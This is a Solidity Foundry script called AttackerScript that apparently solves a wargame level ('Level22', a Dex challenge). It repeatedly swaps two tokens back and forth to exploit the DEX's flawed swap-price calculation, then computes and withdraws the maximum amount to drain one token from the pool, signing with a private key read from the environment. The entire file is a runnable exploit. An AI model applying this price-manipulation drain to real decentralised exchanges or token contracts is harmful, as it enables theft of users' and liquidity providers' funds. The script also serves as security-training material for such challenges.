// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Level22.sol";

contract AttackerScript is Script {
    Dex public dex = Dex(0x0808AFFDfCEDe2eCeF76615311b8f98415e6CFd2);
    address tk1 = dex.token1();
    address tk2 = dex.token2();
    SwappableToken public token1 = SwappableToken(tk1);
    SwappableToken public token2 = SwappableToken(tk2);
    address bob = vm.addr(1); // exploiter address here


    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

      dex.approve(address(dex), 100000);

      //TODO: refactor to cleaner code

      for (uint i = 0; i < 2 ; i++) {
        dex.swap(tk2, tk1, token2.balanceOf(bob));
        dex.swap(tk1, tk2, token1.balanceOf(bob));
        console.log('i', i);
      }
      dex.swap(tk2, tk1, token2.balanceOf(bob));

      uint256 maxWithdrawPossible = dex.getSwapPrice(tk2, tk1, token2.balanceOf(address(dex)));
      console.log('maxWithdrawPossible: ', maxWithdrawPossible);
      dex.swap(tk1, tk2, maxWithdrawPossible);
      console.log("TK1", token1.balanceOf(bob));
      console.log("TK2", token2.balanceOf(bob));
      vm.stopBroadcast();
    }
}
